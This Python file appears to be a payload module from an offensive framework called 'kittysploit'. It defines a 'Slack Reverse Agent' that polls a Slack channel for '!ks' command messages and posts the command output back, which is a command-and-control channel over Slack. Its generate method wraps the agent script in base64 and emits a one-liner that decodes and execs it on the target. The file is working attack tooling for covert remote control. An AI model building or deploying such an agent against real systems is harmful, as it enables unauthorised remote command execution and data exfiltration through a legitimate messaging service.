#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

from kittysploit import *

from lib.c2.slack_reverse_agent import build_slack_reverse_agent_script


class Module(Payload):
    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Python Slack Reverse Agent",
        "description": (
            "Poll Slack channel for !ks cmd messages and post output. "
            "Pairs with listeners/messaging/slack_socketmode."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.MULTI,
        "listener": "listeners/messaging/slack_socketmode",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
    }

    bot_token = OptString("", "Slack bot token (xoxb-...)", True)
    channel_id = OptString("", "Slack channel ID", True)
    client_id = OptString("slack-agent", "Agent client ID (must match listener)", False)
    command_prefix = OptString("!ks", "Command prefix", False)
    poll_interval = OptInteger(3, "Poll interval seconds", False)
    python_binary = OptString("python3", "Python on target", False)

    def generate(self):
        script = build_slack_reverse_agent_script(
            str(self.bot_token),
            str(self.channel_id),
            str(self.client_id or "slack-agent"),
            str(self.command_prefix or "!ks"),
            float(int(self.poll_interval or 3)),
        )
        enc = base64.b64encode(script.encode()).decode("ascii")
        py = str(self.python_binary or "python3")
        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
